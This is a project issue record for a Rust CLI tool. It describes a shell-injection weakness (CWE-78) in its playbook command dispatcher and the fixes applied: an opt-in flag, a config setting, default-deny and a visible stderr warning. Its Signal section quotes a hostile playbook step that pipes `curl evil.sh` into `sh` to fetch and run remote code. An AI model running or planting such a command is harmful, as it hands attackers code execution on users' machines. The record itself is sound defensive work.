---
depth: standard
id: PROB-053
kind: problem
last_modified_at: 2026-05-05T22:46:45.292886+00:00
last_modified_by: claude-code/2.1.128
links:
- target: PROB-050
  relation: based_on
status: active
title: PR-E Round 6 deferred — Delegation::Command CWE-78 surface unguarded
---

## Signal

PR-E Round 6 adversarial security audit (3 parallel agents, 2026-05-05) flagged
`Delegation::Command { command: Vec<String> }` (`crates/forgeplan-core/src/
playbook/types.rs:195` + `command_dispatcher.rs:115-187`) as an unguarded
shell-injection surface (CWE-78 / CWE-94):

```yaml
# Hostile playbook YAML loaded from the marketplace:
- id: malicious-step
  delegate_to:
    command: ["/bin/sh", "-c", "curl evil.sh | sh"]
```

Module documentation at line 7 explicitly calls this "the most
security-sensitive dispatcher" but there is **no allowlist, no signing,
no warning prompt** — only a `tracing::warn!` in the loader. Real CWE-78
vector if any code path ever loads playbooks from network / marketplace.

The marketplace plugin distribution channel (announced in v0.25.0+ and
expanding) makes this an **emerging risk** rather than a theoretical one.
Pre-existing surface (Delegation::Command predates PR-E refactor).

## Constraints

- MUST NOT break existing local-trusted playbook usage (audit.yaml,
  release.yaml, brownfield-docs.yaml use `Delegation::Command` for
  legitimate local commands).
- MUST surface the warning to the **user** (not just `tracing::warn` which
  is silent unless RUST_LOG enables it).
- MUST consider marketplace signing scheme (compatible with future
  `forgeplan_plugins_*` flow).

## Optimization Targets (1-3 max)

- **CLI gate**: `Delegation::Command` execution requires explicit
  `--allow-shell` flag at `forgeplan playbook run` invocation, OR a
  `[playbook.allow_shell] = true` opt-in at workspace config level.
  Default: refuse + print remediation hint.
- **Signature verification**: marketplace playbooks carry a manifest
  signature; `forgeplan_plugins_install` verifies before write to
  workspace. `Delegation::Command` from unsigned playbooks ALWAYS
  refuses, regardless of `--allow-shell`.
- **User-visible warning**: every `Delegation::Command` step prints a
  `! shell-exec: <cmd[0]> ...` line to stderr before execution
  (operator-readable, не tracing-buried).

## Observation Indicators (Anti-Goodhart)

- Existing local playbooks (audit.yaml etc.) keep working with explicit
  `--allow-shell` flag (tested in CI).
- `forgeplan playbook run` of an unsigned marketplace playbook exits
  non-zero with `Error: ... Fix: forgeplan plugins verify <plugin>`.
- Test count ≥ baseline (no test deletion to game the gate).

## Acceptance Criteria

- [x] `forgeplan playbook run` learns `--allow-shell` flag (boolean,
  default `false`). When false, `Delegation::Command` steps refuse with
  `Error:` + `Fix:` markers per Hint Protocol (PRD-071). **Closed by
  PRD-074 Phase 2 + Round 7 HIGH-A (refuse-path hint corrected to
  `--yes --allow-shell`).**
- [x] Workspace config (`config.yaml`) learns `[playbook] allow_shell =
  true` opt-in for trusted-local workflows. **Closed by PRD-074 Phase 3
  + Round 7 HIGH-B (config-only path emits dedicated banner).**
- [x] Marketplace signing scheme **explicitly deferred** to follow-up —
  see PRD-074 §Non-Goals. Default-deny (current closure) prevents
  shell-exec from any source until a per-invocation opt-in is provided;
  signing flow will gate `--allow-shell` itself when marketplace fetch
  ships.
- [x] User-visible stderr warning before `Delegation::Command` executes.
  **Closed by PRD-074 Phase 1**: `! shell-exec: <full argv>` rendered
  via `escape_debug` (Round 7 HIGH-F closes terminal-injection,
  CWE-117 / CWE-150). Capped at 4 KiB rendered.
- [x] Updated `release.yaml` reference doc to show `--allow-shell`
  requirement. (audit.yaml + brownfield-docs.yaml use Plugin/Skill
  dispatchers; не affected.)
- [x] CHANGELOG entry under **Security** section + migration note for
  operators. **Closed in this PR** — see CHANGELOG `[Unreleased]` block.

## Closure summary (2026-05-06, Round 7 audit applied)

- 3 parallel adversarial agents (architect, code-reviewer, security)
  returned FIX-FIRST. 9+ findings closed in this PR; 7+ items deferred
  to follow-up PROBs (out-of-scope for `Delegation::Command` gate
  itself).
- `validate_command_delegate_security` parameter renamed `yes_flag` →
  `allow_shell`. `SecurityError::ShellRequiresYes` renamed →
  `ShellRequiresAllowShell` (deprecated alias provided for
  one-release migration window).
- `ExecutorConfig` gained dedicated `allow_shell: bool` field
  (independent от blanket `yes_flag`).
- 1985 tests pass (+8 от Round 7: shell-exec warning escape, full-argv
  render, pathological truncation, PlaybookConfig serde round-trip).
- Real E2E PASS: refuse без `--allow-shell` (с `--yes`); success с
  `--yes --allow-shell`; stderr `! shell-exec: /bin/echo hello`
  visible.

## Refs

- PR-E Round 6 audit (2026-05-05): security-expert agent MED-2 (origin)
- PRD-074 (the closure scope) — `forgeplan get PRD-074`
- RFC-008 (implementation phases) — `forgeplan get RFC-008`
- CHANGELOG.md `[Unreleased]` (2026-05-06)
- Round 7 audit findings tracked as TaskList items #30..#43 в the
  closure session
- ADR-011 §Security (Phase B Wave 1)




